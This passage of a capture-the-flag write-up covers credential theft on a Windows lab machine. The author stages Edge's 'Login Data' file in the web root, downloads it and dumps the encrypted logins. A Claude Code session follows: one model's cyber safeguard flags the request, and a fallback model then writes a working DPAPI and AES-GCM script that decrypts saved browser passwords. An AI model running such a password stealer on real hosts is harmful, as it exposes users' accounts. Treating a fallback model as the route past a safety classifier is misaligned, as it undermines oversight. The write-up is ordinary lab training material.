04/19/2024  05:53 PM               468 1fb8f70f-47eb-4349-9bd6-1d127f39a89e
04/20/2025  12:29 PM               468 592ac9cb-c0d7-441e-b163-ba9d07c6e1fd
10/21/2025  02:23 PM               468 908daf73-20f9-47e0-bf1a-e80eb1eb3f84
10/11/2026  02:23 PM               468 e5930e5b-c85b-4682-a5aa-5686a9619ad3
10/11/2026  02:23 PM                24 Preferred
               5 File(s)          1,896 bytes
               2 Dir(s)   5,282,582,528 bytes free
```

Multiple keys are normal, as Windows creates a new DPAPI master key every 90 days.

There are no DPAPI credential blobs:

```
C:\Users\web\AppData\Local\Microsoft\Credentials>dir /a 
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Local\Microsoft\Credentials

10/21/2025  02:23 PM    <DIR>          .
10/21/2025  02:23 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   5,282,582,528 bytes free
```

There is Edge `Login Data`:

```sql
C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default>dir "Login Data"
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default

10/22/2025  11:54 AM            51,200 Login Data
               1 File(s)         51,200 bytes
               0 Dir(s)   5,282,578,432 bytes free
```

The `Local State` file one directory up has the keys for that data, and it’s DPAPI encrypted.

I’ll copy `Login Data` to the webserver:

```sql
C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default>copy "Login Data" C:\Web\Eloquia\static\
        1 file(s) copied.
```

And collect it with `wget`:

```powershell
oxdf@hacky$ wget eloquia.htb/static/Login%20Data
--2026-10-12 07:54:03--  http://eloquia.htb/static/Login%20Data
Resolving eloquia.htb (eloquia.htb)... 10.129.244.81
Connecting to eloquia.htb (eloquia.htb)|10.129.244.81|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 51200 (50K) [text/plain]
Saving to: ‘Login Data’

Login Data                        100%[============================================================>]  50.00K  --.-KB/s    in 0.04s   

2026-10-12 07:54:03 (1.12 MB/s) - ‘Login Data’ saved [51200/51200]

oxdf@hacky$ file Login\ Data 
Login Data: SQLite 3.x database, last written using SQLite version 3045001, page size 2048, file counter 4, database pages 25, cookie 0xe, schema 4, UTF-8, version-valid-for 4
```

It’s a SQLite DB. The `logins` table has the passwords:

```powershell
oxdf@hacky$ sqlite3 Login\ Data
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
breached                logins_edge_extended    stats                 
insecure_credentials    meta                    sync_entities_metadata
logins                  password_notes          sync_model_metadata   
sqlite> .headers on
sqlite> select username_value,password_value from logins;
username_value|password_value
olivia.kat|v10*y#/H±=+&\[       n^rd#쩺%Ԋ!b
o)l.pisY6M~n/0
SF
FLgt|v107G_$iXS!Ld/:
olivia.kat|v10
```

They start with “v10”, which is the old straightforward encryption. If it were “v20”, it would be app-bound encryption, which would add another layer to the decryption.

### Recover Password

To get access to the passwords in the Edge file, I’ll need the DPAPI master key. I can recover that on my VM if I have the web user’s password (for a local account like web, the NTLM hash isn’t enough), but I don’t. So I’ll have to do it on the host as the web user.

Without PowerShell, this will be tricky. One thing I do have is Python, which AppLocker allows since it’s installed under `%ProgramFiles%`. I’ll check what packages are installed in `C:\Program Files\Python311\Lib\site-packages` and have Claude make this script:

```sql
 ▐▛███▛█   Claude Code v2.1.296
▝▜██████▀  Opus 5.5 · Claude Max
 ▝▝   ▝▝   ~/hackthebox/eloquia

❯ build a python script in this directory that can decrypt a user's edge "login data" entires run on the windows host with no special libraries. it should get the username of the current user, print the master key as well as the aeskey in local state. then print each site url, username, and password. here are the packages available: Directory of C:\PROGRA~1\Python311\Lib\site-packages

  10/07/2025  02:44 AM    <DIR>          .                                      
  10/07/2025  02:44 AM    <DIR>          ..                                     
  04/22/2024  04:49 AM    <DIR>          adodbapi                               
  04/20/2025  12:14 PM    <DIR>          appconf                                
  04/16/2024  08:34 AM    <DIR>          asgiref                                
  04/16/2024  08:34 AM    <DIR>          asgiref-3.8.1.dist-info                
  04/16/2024  09:07 AM    <DIR>          attr                                   
  04/16/2024  09:07 AM    <DIR>          attrs                                  
  04/16/2024  09:07 AM    <DIR>          attrs-23.2.0.dist-info                 
  04/27/2025  09:41 AM    <DIR>          beautifulsoup4-4.13.4.dist-info        
  04/27/2025  09:41 AM    <DIR>          bs4                                    
  04/27/2025  09:41 AM    <DIR>          bs4-0.0.2.dist-info                    
  04/16/2024  08:39 AM    <DIR>          certifi                                
  04/16/2024  08:39 AM    <DIR>          certifi-2024.2.2.dist-info             
  04/16/2024  08:53 AM    <DIR>          cffi                                   
  04/16/2024  08:53 AM    <DIR>          cffi-1.16.0.dist-info                  
  04/16/2024  08:39 AM    <DIR>          charset_normalizer                     
  04/16/2024  08:39 AM    <DIR>          charset_normalizer-3.3.2.dist-info     
  04/22/2024  04:52 AM    <DIR>          click                                  
  04/22/2024  04:52 AM    <DIR>          click-8.1.7.dist-info                  
  04/22/2024  04:52 AM    <DIR>          colorama                               
  04/22/2024  04:52 AM    <DIR>          colorama-0.4.6.dist-info               
  04/16/2024  08:47 AM             1,484 COPYING                                
  04/22/2024  04:50 AM    <DIR>          Crypto                                 
  04/16/2024  08:53 AM    <DIR>          cryptography                           
  04/16/2024  08:53 AM    <DIR>          cryptography-42.0.5.dist-info          
  04/16/2024  08:38 AM    <DIR>          csp                                    
  04/15/2024  10:07 PM               151 distutils-precedence.pth               
  04/16/2024  08:34 AM    <DIR>          django                                 
  04/16/2024  08:35 AM    <DIR>          Django-5.0.4.dist-info                 
  04/20/2025  12:14 PM    <DIR>          django_appconf-1.1.0.dist-info         
  04/20/2025  12:14 PM    <DIR>          django_cryptography                    
  04/20/2025  12:14 PM    <DIR>                                                  django_cryptography_django5-2.2.dist-info                                     
  04/16/2024  08:38 AM    <DIR>          django_csp-3.8.dist-info               
  04/16/2024  08:37 AM    <DIR>          django_grappelli-3.0.8.dist-info       
  04/20/2025  02:22 PM    <DIR>          django_oauth_toolkit-3.0.1.dist-info   
  04/20/2025  12:14 PM    <DIR>          django_sql_explorer-5.3.dist-info      
  04/22/2025  11:43 PM    <DIR>          explorer                               
  04/16/2024  08:41 AM    <DIR>          filetype                               
  04/16/2024  08:41 AM    <DIR>          filetype-1.2.0.dist-info               
  04/20/2025  08:10 PM    <DIR>          grappelli                              
  04/16/2024  09:07 AM    <DIR>          h11                                    
  04/16/2024  09:07 AM    <DIR>          h11-0.14.0.dist-info                   
  04/16/2024  08:39 AM    <DIR>          idna                                   
  04/16/2024  08:39 AM    <DIR>          idna-3.7.dist-info                     
  04/22/2024  04:49 AM    <DIR>          isapi                                  
  04/16/2024  08:53 AM    <DIR>          jwcrypto                               
  04/16/2024  08:53 AM    <DIR>          jwcrypto-1.5.6.dist-info               
  04/22/2024  04:52 AM    <DIR>          markdown_it                            
  04/22/2024  04:52 AM    <DIR>          markdown_it_py-3.0.0.dist-info         
  04/22/2024  04:52 AM    <DIR>          mdurl                                  
  04/22/2024  04:52 AM    <DIR>          mdurl-0.1.2.dist-info                  
  04/20/2025  02:22 PM    <DIR>          oauth2_provider                        
  04/16/2024  08:53 AM    <DIR>          oauthlib                               
  04/16/2024  08:53 AM    <DIR>          oauthlib-3.2.2.dist-info               
  04/16/2024  09:07 AM    <DIR>          outcome                                
  04/16/2024  09:07 AM    <DIR>          outcome-1.3.0.post0.dist-info          
  04/16/2024  08:40 AM    <DIR>          PIL                                    
  04/16/2024  08:40 AM    <DIR>          pillow-10.3.0.dist-info                
  04/15/2024  10:08 PM    <DIR>          pip                                    
  04/15/2024  10:08 PM    <DIR>          pip-24.0.dist-info                     
  04/15/2024  10:07 PM    <DIR>          pkg_resources                          
  04/16/2024  08:52 AM    <DIR>          provider                               
  04/22/2024  04:51 AM    <DIR>          pyasn1                                 
  04/22/2024  04:51 AM    <DIR>          pyasn1-0.6.0.dist-info                 
  04/16/2024  08:53 AM    <DIR>          pycparser                              
  04/16/2024  08:53 AM    <DIR>          pycparser-2.22.dist-info               
  04/22/2024  04:50 AM    <DIR>          pycryptodome-3.20.0.dist-info          
  04/22/2024  04:52 AM    <DIR>          pygments                               
  04/22/2024  04:52 AM    <DIR>          pygments-2.17.2.dist-info              
  04/16/2024  09:07 AM    <DIR>          PySocks-1.7.1.dist-info                
  04/22/2024  04:49 AM               139 pythoncom.py                           
  04/22/2024  04:49 AM    <DIR>          pythonwin                              
  04/22/2024  04:50 AM    <DIR>          pywin32-306.dist-info                  
  04/22/2024  04:49 AM         2,648,456 PyWin32.chm                            
  04/22/2024  04:49 AM               178 pywin32.pth                            
  04/22/2024  04:49 AM                 5 pywin32.version.txt                    
  04/22/2024  04:49 AM    <DIR>          pywin32_system32                       
  04/27/2025  09:41 AM               159 README.rst                             
  04/02/2024  12:42 PM               121 README.txt                             
  04/16/2024  08:39 AM    <DIR>          requests                               
  04/16/2024  08:39 AM    <DIR>          requests-2.31.0.dist-info              
  04/22/2024  04:52 AM    <DIR>          rich                                   
  04/22/2024  04:52 AM    <DIR>          rich-13.7.1.dist-info                  
  04/16/2024  09:07 AM    <DIR>          selenium                               
  04/16/2024  09:07 AM    <DIR>          selenium-4.19.0.dist-info              
  04/15/2024  10:07 PM    <DIR>          setuptools                             
  04/15/2024  10:08 PM    <DIR>          setuptools-65.5.0.dist-info            
  04/16/2024  08:47 AM    <DIR>          shortuuid                              
  04/16/2024  08:47 AM    <DIR>          shortuuid-1.0.13.dist-info             
  04/16/2024  08:47 AM    <DIR>          six-1.16.0.dist-info                   
  04/16/2024  08:47 AM            34,549 six.py                                 
  04/16/2024  09:07 AM    <DIR>          sniffio                                
  04/16/2024  09:07 AM    <DIR>          sniffio-1.3.1.dist-info                
  04/16/2024  09:07 AM            31,086 socks.py                               
  04/16/2024  09:07 AM             3,966 sockshandler.py                        
  04/16/2024  09:07 AM    <DIR>          sortedcontainers                       
  04/16/2024  09:07 AM    <DIR>          sortedcontainers-2.4.0.dist-info       
  04/27/2025  09:41 AM    <DIR>          soupsieve                              
  04/27/2025  09:41 AM    <DIR>          soupsieve-2.7.dist-info                
  04/16/2024  08:34 AM    <DIR>          sqlparse                               
  04/16/2024  08:34 AM    <DIR>          sqlparse-0.5.0.dist-info               
  04/20/2025  12:14 PM    <DIR>          tests                                  
  04/16/2024  09:07 AM    <DIR>          trio                                   
  04/16/2024  09:07 AM    <DIR>          trio-0.25.0.dist-info                  
  04/16/2024  09:07 AM    <DIR>          trio_websocket                         
  04/16/2024  09:07 AM    <DIR>          trio_websocket-0.11.1.dist-info        
  04/16/2024  08:53 AM    <DIR>          typing_extensions-4.11.0.dist-info     
  04/16/2024  08:53 AM           122,293 typing_extensions.py                   
  04/16/2024  08:34 AM    <DIR>          tzdata                                 
  04/16/2024  08:34 AM    <DIR>          tzdata-2024.1.dist-info                
  04/16/2024  08:39 AM    <DIR>          urllib3                                
  04/16/2024  08:39 AM    <DIR>          urllib3-2.2.1.dist-info                
  05/02/2025  08:40 AM    <DIR>          uvicorn                                
  05/02/2025  08:40 AM    <DIR>          uvicorn-0.34.2.dist-info               
  10/07/2025  02:44 AM    <DIR>          waitress                               
  10/07/2025  02:44 AM    <DIR>          waitress-3.0.2.dist-info               
  04/22/2024  04:49 AM    <DIR>          win32                                  
  04/22/2024  04:50 AM    <DIR>          win32com                               
  04/22/2024  04:49 AM    <DIR>          win32comext                            
  04/16/2024  09:07 AM    <DIR>          wsproto                                
  04/16/2024  09:07 AM    <DIR>          wsproto-1.2.0.dist-info                
  04/16/2024  08:53 AM           181,248 _cffi_backend.cp311-win_amd64.pyd      
  04/15/2024  10:07 PM    <DIR>          _distutils_hack                        
  04/22/2024  04:49 AM    <DIR>          __pycache__                            
                13 File(s)      3,023,835 bytes                                 
               112 Dir(s)   5,279,838,208 bytes free                            

● Opus 5.5's safeguards stopped the response above · continuing once with that noted

● Opus 5.5's safeguards flagged this session. You may be seeing this for the first time: Opus 5.5 is more capable and has stronger safeguards as a result, which can sometimes flag non-cybersecurity work. We're improving these safeguards to reduce the amount of incorrectly flagged messages. Opus 4.8 is answering instead, or you can edit and retry with Opus 5.5. Send feedback with /feedback or learn more

Details: `[cyber]`
  ⎿  Tip: You can configure model switch behavior in /config

● This is a standard DPAPI-based browser credential decryption task — legitimate for authorized testing/CTF where you have access to the host and your own profile. I'll build it to run on the Windows host using only stdlib (ctypes, sqlite3, base64, json, os) plus pycryptodome (the Crypto package you have listed) for AES-256-GCM. No pywin32 needed — DPAPI is called directly via ctypes.

● Write(edge_decrypt.py)
  ⎿  Added 117 lines, removed 296 lines
        1  #!/usr/bin/env python3
        2 -"""                                                           
        3 -edge_decrypt.py - Decrypt the current Windows user's Microsoft
          - Edge "Login Data".                                           
        2 +r"""                                                          
        3 +edge_decrypt.py - Decrypt Microsoft Edge "Login Data" on a Win
          +dows host.                                                    
        4  
        5 -Standard library only. No pip packages required.              
        6 -  - DPAPI (CryptUnprotectData) is reached through ctypes.     
        7 -  - AES-256-GCM is implemented in pure Python below.          
        5 +Runs with only the Python standard library (ctypes, sqlite3, j
          +son, base64,                                                  
        6 +os, shutil) plus pycryptodome (the `Crypto` package) for AES-2
          +56-GCM.                                                       
        7 +No pywin32 required: DPAPI is called directly through ctypes/c
          +rypt32.                                                       
        8  
        9 -This only works for the account it is run under: the AES key i
          -n "Local State"                                               
       10 -is wrapped with DPAPI, which releases it solely to the user wh
          -o stored it.                                                  
        9 +Decrypts the *current* user's own Edge credentials using that 
          +user's DPAPI                                                  
       10 +master key, so it must be run as the user who owns the profile
          +.                                                             
       11  
       12 -Usage:                                                        
       13 -    python edge_decrypt.py            # decrypt current user's
          - Edge logins                                                  
       14 -    python edge_decrypt.py --selftest # verify the AES-GCM imp
          -lementation                                                   
       12 +Steps:                                                        
       13 +  1. Print the current username.                              
       14 +  2. Read Local State, print the base64 "app-bound"/encrypted 
          +AES key,                                                      
       15 +     then DPAPI-decrypt it to the master AES key (printed as h
          +ex).                                                          
       16 +  3. Read the Login Data SQLite DB and, for each row, print   
       17 +     url / username / password.                               
       18  """
       19  
       17 -import os                                                     
       18 -import sys                                                    
       19 -import json                                                   
       20  import base64
       21 +import ctypes                                                 
       22 +import ctypes.wintypes                                        
       23 +import json                                                   
       24 +import os                                                     
       25  import shutil
       26  import sqlite3
       23 -import getpass                                                
       27 +import sys                                                    
       28  import tempfile
       29  
       26 -# ------------------------------------------------------------
          ---------------- #                                             
       27 -#  Pure-Python AES (encrypt single block) + key schedule for A
          -ES-128/192/256                                                
       28 -# ------------------------------------------------------------
          ---------------- #                                             
       30 +from Crypto.Cipher import AES                                 
       31  
       30 -def _gmul(a, b):                                              
       31 -    """Multiply two bytes in GF(2^8) (AES field, poly 0x11b)."
          -""                                                            
       32 -    p = 0                                                     
       33 -    for _ in range(8):                                        
       34 -        if b & 1:                                             
       35 -            p ^= a                                            
       36 -        hi = a & 0x80                                         
       37 -        a = (a << 1) & 0xFF                                   
       38 -        if hi:                                                
       39 -            a ^= 0x1B                                         
       40 -        b >>= 1                                               
       41 -    return p                                                  
       32  
       43 -                                                              
       44 -def _build_sbox():                                            
       45 -    inv = [0] * 256                                           
       46 -    for a in range(1, 256):                                   
       47 -        for b in range(1, 256):                               
       48 -            if _gmul(a, b) == 1:                              
       49 -                inv[a] = b                                    
       50 -                break                                         
       51 -    sbox = [0] * 256                                          
       52 -    for i in range(256):                                      
       53 -        s = inv[i]                                            
       54 -        x = s                                                 
       55 -        for _ in range(4):                                    
       56 -            s = ((s << 1) | (s >> 7)) & 0xFF                  
       57 -            x ^= s                                            
       58 -        sbox[i] = x ^ 0x63                                    
       59 -    return sbox                                               
       60 -                                                              
       61 -                                                              
       62 -_SBOX = _build_sbox()                                         
       63 -_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B,
          - 0x36,                                                        
       64 -         0x6C, 0xD8, 0xAB, 0x4D]                              
       65 -                                                              
       66 -                                                              
       67 -def _key_expansion(key):                                      
       68 -    """Return the AES round-key words (list of 4-byte lists)."
          -""                                                            
       69 -    nk = len(key) // 4                                        
       70 -    nr = nk + 6                                               
       71 -    words = [list(key[4 * i:4 * i + 4]) for i in range(nk)]   
       72 -    for i in range(nk, 4 * (nr + 1)):                         
       73 -        temp = list(words[i - 1])                             
       74 -        if i % nk == 0:                                       
       75 -            temp = temp[1:] + temp[:1]                      # 
          -RotWord                                                       
       76 -            temp = [_SBOX[b] for b in temp]                 # 
          -SubWord                                                       
       77 -            temp[0] ^= _RCON[i // nk - 1]                     
       78 -        elif nk > 6 and i % nk == 4:                          
       79 -            temp = [_SBOX[b] for b in temp]                   
       80 -        words.append([words[i - nk][j] ^ temp[j] for j in rang
          -e(4)])                                                        
       81 -    return words, nr                                          
       82 -                                                              
       83 -                                                              
       84 -def _encrypt_block(block, words, nr):                         
       85 -    """Encrypt one 16-byte block (bytes) -> 16-byte bytes.""" 
       86 -    # state as column-major 4x4                               
       87 -    s = [[block[r + 4 * c] for c in range(4)] for r in range(4
          -)]                                                            
       88 -                                                              
       89 -    def add_round_key(rnd):                                   
       90 -        for c in range(4):                                    
       91 -            w = words[rnd * 4 + c]                            
       92 -            for r in range(4):                                
       93 -                s[r][c] ^= w[r]                               
       94 -                                                              
       95 -    def sub_bytes():                                          
       96 -        for r in range(4):                                    
       97 -            for c in range(4):                                
       98 -                s[r][c] = _SBOX[s[r][c]]                      
       99 -                                                              
      100 -    def shift_rows():                                         
      101 -        for r in range(1, 4):                                 
      102 -            s[r] = s[r][r:] + s[r][:r]                        
      103 -                                                              
      104 -    def mix_columns():                                        
      105 -        for c in range(4):                                    
      106 -            a = [s[r][c] for r in range(4)]                   
      107 -            s[0][c] = _gmul(a[0], 2) ^ _gmul(a[1], 3) ^ a[2] ^
          - a[3]                                                         
      108 -            s[1][c] = a[0] ^ _gmul(a[1], 2) ^ _gmul(a[2], 3) ^
          - a[3]                                                         
      109 -            s[2][c] = a[0] ^ a[1] ^ _gmul(a[2], 2) ^ _gmul(a[3
          -], 3)                                                         
      110 -            s[3][c] = _gmul(a[0], 3) ^ a[1] ^ a[2] ^ _gmul(a[3
          -], 2)                                                         
      111 -                                                              
      112 -    add_round_key(0)                                          
      113 -    for rnd in range(1, nr):                                  
      114 -        sub_bytes()                                           
      115 -        shift_rows()                                          
      116 -        mix_columns()                                         
      117 -        add_round_key(rnd)                                    
      118 -    sub_bytes()                                               
      119 -    shift_rows()                                              
      120 -    add_round_key(nr)                                         
      121 -                                                              
      122 -    return bytes(s[r][c] for c in range(4) for r in range(4)) 
      123 -                                                              
      124 -                                                              
       33  # ------------------------------------------------------------
           --------------- #
      126 -#  AES-GCM (decrypt + tag verification), built on the block ci
          -pher above                                                    
       34 +# DPAPI via ctypes (crypt32.CryptUnprotectData) - no pywin32 n
          +eeded                                                         
       35  # ------------------------------------------------------------
           --------------- #
       36 +class DATA_BLOB(ctypes.Structure):                            
       37 +    _fields_ = [                                              
       38 +        ("cbData", ctypes.wintypes.DWORD),                    
       39 +        ("pbData", ctypes.POINTER(ctypes.c_char)),            
       40 +    ]                                                         
       41  
      129 -def _gf_mult(x, y):                                           
      130 -    """Multiply in GF(2^128) as defined by GCM (bit 127 = MSB)
          -."""                                                          
      131 -    R = 0xE1 << 120                                           
      132 -    z = 0                                                     
      133 -    v = x                                                     
      134 -    for i in range(127, -1, -1):                              
      135 -        if (y >> i) & 1:                                      
      136 -            z ^= v                                            
      137 -        if v & 1:                                             
      138 -            v = (v >> 1) ^ R                                  
      139 -        else:                                                 
      140 -            v >>= 1                                           
      141 -    return z                                                  
       42  
      143 -                                                              
      144 -def _ghash(h, aad, ciphertext):                               
      145 -    def pad16(d):                                             
      146 -        if len(d) % 16:                                       
      147 -            d = d + b"\x00" * (16 - len(d) % 16)              
      148 -        return d                                              
      149 -                                                              
      150 -    y = 0                                                     
      151 -    data = pad16(aad) + pad16(ciphertext)                     
      152 -    for i in range(0, len(data), 16):                         
      153 -        y ^= int.from_bytes(data[i:i + 16], "big")            
      154 -        y = _gf_mult(y, h)                                    
      155 -    length_block = (len(aad) * 8).to_bytes(8, "big") + \      
      156 -                   (len(ciphertext) * 8).to_bytes(8, "big")   
      157 -    y ^= int.from_bytes(length_block, "big")                  
      158 -    y = _gf_mult(y, h)                                        
      159 -    return y.to_bytes(16, "big")                              
      160 -                                                              
      161 -                                                              
      162 -def aes_gcm_decrypt(key, nonce, ciphertext, tag, aad=b""):    
      163 -    """Return plaintext, or raise ValueError if the tag does n
          -ot verify."""                                                 
      164 -    words, nr = _key_expansion(key)                           
      165 -    h = int.from_bytes(_encrypt_block(b"\x00" * 16, words, nr)
          -, "big")                                                      
      166 -                                                              
      167 -    if len(nonce) == 12:                                      
      168 -        j0 = nonce + b"\x00\x00\x00\x01"                      
      169 -    else:                                                     
      170 -        j0 = _ghash(h, b"", nonce)  # GCM spec for non-96-bit 
          -nonces                                                        
      171 -                                                              
      172 -    # Verify tag first.                                       
      173 -    s = _ghash(h, aad, ciphertext)                            
      174 -    ej0 = _encrypt_block(j0, words, nr)                       
      175 -    expected = bytes(a ^ b for a, b in zip(s, ej0))           
      176 -    if expected != tag:                                       
      177 -        raise ValueError("GCM tag mismatch (wrong key or corru
          -pt data)")                                                    
      178 -                                                              
      179 -    # CTR decrypt starting at inc32(J0).                      
      180 -    counter = int.from_bytes(j0, "big")                       
      181 -    out = bytearray()                                         
      182 -    for i in range(0, len(ciphertext), 16):                   
      183 -        counter = (counter & ~0xFFFFFFFF) | ((counter + 1) & 0
          -xFFFFFFFF)                                                    
      184 -        ks = _encrypt_block(counter.to_bytes(16, "big"), words
          -, nr)                                                         
      185 -        block = ciphertext[i:i + 16]                          
      186 -        out.extend(a ^ b for a, b in zip(block, ks))          
      187 -    return bytes(out)                                         
      188 -                                                              
      189 -                                                              
      190 -# ------------------------------------------------------------
          ---------------- #                                             
      191 -#  Windows DPAPI via ctypes                                   
      192 -# ------------------------------------------------------------
          ---------------- #                                             
      193 -                                                              
      194 -def dpapi_decrypt(data):                                      
      195 -    import ctypes                                             
      196 -    from ctypes import wintypes                               
      197 -                                                              
      198 -    class DATA_BLOB(ctypes.Structure):                        
      199 -        _fields_ = [("cbData", wintypes.DWORD),               
      200 -                    ("pbData", ctypes.POINTER(ctypes.c_char))]
      201 -                                                              
      202 -    buf_in = ctypes.create_string_buffer(data, len(data))     
      203 -    blob_in = DATA_BLOB(len(data),                            
      204 -                        ctypes.cast(buf_in, ctypes.POINTER(cty
          -pes.c_char)))                                                 
       43 +def dpapi_decrypt(encrypted_bytes: bytes) -> bytes:           
       44 +    """Decrypt a DPAPI blob for the current user (CRYPTPROTECT
          +_UI_FORBIDDEN)."""                                            
       45 +    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_st
          +ring_buffer(encrypted_bytes))                                 
       46      blob_out = DATA_BLOB()
       47  
       48      ok = ctypes.windll.crypt32.CryptUnprotectData(
      208 -        ctypes.byref(blob_in), None, None, None, None, 0,     
      209 -        ctypes.byref(blob_out))                               
       49 +        ctypes.byref(blob_in),   # pDataIn                    
       50 +        None,                    # ppszDataDescr              
       51 +        None,                    # pOptionalEntropy           
       52 +        None,                    # pvReserved                 
       53 +        None,                    # pPromptStruct              
       54 +        0x01,                    # dwFlags = CRYPTPROTECT_UI_F
          +ORBIDDEN                                                      
       55 +        ctypes.byref(blob_out),  # pDataOut                   
       56 +    )                                                         
       57      if not ok:
       58          raise ctypes.WinError()
       59  
      213 -    n = blob_out.cbData                                       
      214 -    out = ctypes.create_string_buffer(n)                      
      215 -    ctypes.memmove(out, blob_out.pbData, n)                   
       60 +    size = blob_out.cbData                                    
       61 +    buf = ctypes.create_string_buffer(size)                   
       62 +    ctypes.memmove(buf, blob_out.pbData, size)                
       63      ctypes.windll.kernel32.LocalFree(blob_out.pbData)
      217 -    return out.raw                                            
       64 +    return buf.raw                                            
       65  
       66  
       67  # ------------------------------------------------------------
           --------------- #
      221 -#  Edge-specific logic                                        
       68 +# Key / password handling                                     
       69  # ------------------------------------------------------------
           --------------- #
       70 +def get_master_key(local_state_path: str) -> bytes:           
       71 +    """Read Local State, print the stored b64 key, return the 
          +DPAPI-decrypted key."""                                       
       72 +    with open(local_state_path, "r", encoding="utf-8") as fh: 
       73 +        local_state = json.load(fh)                           
       74  
      224 -def edge_user_data_dir():                                     
      225 -    local = os.environ.get("LOCALAPPDATA")                    
      226 -    if not local:                                             
      227 -        raise RuntimeError("LOCALAPPDATA is not set; run on Wi
          -ndows.")                                                      
      228 -    return os.path.join(local, "Microsoft", "Edge", "User Data
          -")                                                            
       75 +    b64_key = local_state["os_crypt"]["encrypted_key"]        
       76 +    print(f"[+] Local State encrypted_key (base64):\n    {b64_
          +key}\n")                                                      
       77  
       78 +    encrypted_key = base64.b64decode(b64_key)                 
       79 +    # Strip the 5-byte "DPAPI" prefix that Edge/Chrome prepend
          +.                                                             
       80 +    if encrypted_key[:5] == b"DPAPI":                         
       81 +        encrypted_key = encrypted_key[5:]                     
       82 +    else:                                                     
       83 +        print("[!] Warning: 'DPAPI' prefix not found; attempti
          +ng decrypt as-is.")                                           
       84  
      231 -def get_master_key(local_state_path):                         
      232 -    """Return (encrypted_key_b64, decrypted_aes_key_bytes)."""
      233 -    with open(local_state_path, "r", encoding="utf-8") as f:  
      234 -        state = json.load(f)                                  
      235 -    enc_b64 = state["os_crypt"]["encrypted_key"]              
      236 -    enc = base64.b64decode(enc_b64)                           
      237 -    if enc[:5] != b"DPAPI":                                   
      238 -        raise ValueError("Unexpected key header (not DPAPI-wra
          -pped)")                                                       
      239 -    aes_key = dpapi_decrypt(enc[5:])   # strip the 'DPAPI' pre
          -fix                                                           
      240 -    return enc_b64, aes_key                                   
       85 +    master_key = dpapi_decrypt(encrypted_key)                 
       86 +    print(f"[+] Decrypted master AES key (hex):\n    {master_k
          +ey.hex()}\n")                                                 
       87 +    return master_key                                         
       88  
       89  
      243 -def decrypt_value(blob, aes_key):                             
       90 +def decrypt_password(blob: bytes, master_key: bytes) -> str:  
       91 +    """Decrypt a password_value blob (AES-256-GCM v10/v11, or 
          +legacy DPAPI)."""                                             
       92      if not blob:
       93          return ""
       94 +                                                              
       95      prefix = blob[:3]
       96      if prefix in (b"v10", b"v11"):
      248 -        nonce = blob[3:15]                                    
      249 -        ct = blob[15:-16]                                     
      250 -        tag = blob[-16:]                                      
      251 -        return aes_gcm_decrypt(aes_key, nonce, ct, tag).decode
          -("utf-8", "replace")                                          
      252 -    if prefix == b"v20":                                      
      253 -        return "<app-bound (v20) encryption; not supported by 
          -this script>"                                                 
      254 -    # Legacy: directly DPAPI-protected.                       
      255 -    try:                                                      
      256 -        return dpapi_decrypt(blob).decode("utf-8", "replace") 
      257 -    except Exception as e:                                    
      258 -        return "<decrypt failed: %s>" % e                     
       97 +        nonce = blob[3:15]            # 12-byte IV            
       98 +        ciphertext = blob[15:-16]     # payload               
       99 +        tag = blob[-16:]              # 16-byte GCM auth tag  
      100 +        try:                                                  
      101 +            cipher = AES.new(master_key, AES.MODE_GCM, nonce=n
          +once)                                                         
      102 +            plaintext = cipher.decrypt_and_verify(ciphertext, 
          +tag)                                                          
      103 +            return plaintext.decode("utf-8", errors="replace")
      104 +        except Exception as exc:                              
      105 +            return f"<decrypt-failed: {exc}>"                 
      106  
      260 -                                                              
      261 -def iter_login_dbs(user_data_dir):                            
      262 -    for entry in sorted(os.listdir(user_data_dir)):           
      263 -        profile = os.path.join(user_data_dir, entry)          
      264 -        db = os.path.join(profile, "Login Data")              
      265 -        if os.path.isfile(db):                                
      266 -            yield entry, db                                   
      267 -                                                              
      268 -                                                              
      269 -def dump_logins(db_path, aes_key):                            
      270 -    tmp = os.path.join(tempfile.gettempdir(), "edge_logindata_
          -copy.db")                                                     
      271 -    shutil.copy2(db_path, tmp)          # Edge keeps the live 
          -DB locked                                                     
      107 +    # Legacy format: the whole blob is a DPAPI blob.          
      108      try:
      273 -        con = sqlite3.connect(tmp)                            
      274 -        cur = con.cursor()                                    
      275 -        cur.execute("SELECT origin_url, username_value, passwo
          -rd_value "                                                    
      276 -                    "FROM logins")                            
      277 -        rows = cur.fetchall()                                 
      278 -        con.close()                                           
      279 -    finally:                                                  
      280 -        try:                                                  
      281 -            os.remove(tmp)                                    
      282 -        except OSError:                                       
      283 -            pass                                              
      109 +        return dpapi_decrypt(blob).decode("utf-8", errors="rep
          +lace")                                                        
      110 +    except Exception as exc:                                  
      111 +        return f"<dpapi-decrypt-failed: {exc}>"               
      112  
      285 -    results = []                                              
      286 -    for url, user, pw_blob in rows:                           
      287 -        results.append((url, user, decrypt_value(pw_blob, aes_
          -key)))                                                        
      288 -    return results                                            
      113  
      114 +# ------------------------------------------------------------
          +--------------- #                                             
      115 +# Main                                                        
      116 +# ------------------------------------------------------------
          +--------------- #                                             
      117 +def main() -> int:                                            
      118 +    username = os.environ.get("USERNAME") or os.environ.get("U
          +SER") or "<unknown>"                                          
      119 +    print(f"[+] Current user: {username}\n")                  
      120  
      291 -def main():                                                   
      292 -    print("[*] Current user: %s" % getpass.getuser())         
      121 +    local_appdata = os.environ.get("LOCALAPPDATA")            
      122 +    if not local_appdata:                                     
      123 +        local_appdata = os.path.join(r"C:\Users", username, r"
          +AppData\Local")                                               
      124  
      294 -    user_data = edge_user_data_dir()                          
      295 -    local_state = os.path.join(user_data, "Local State")      
      296 -    print("[*] User Data dir: %s" % user_data)                
      125 +    edge_user_data = os.path.join(local_appdata, "Microsoft", 
          +"Edge", "User Data")                                          
      126 +    local_state_path = os.path.join(edge_user_data, "Local Sta
          +te")                                                          
      127 +    login_data_path = os.path.join(edge_user_data, "Default", 
          +"Login Data")                                                 
      128  
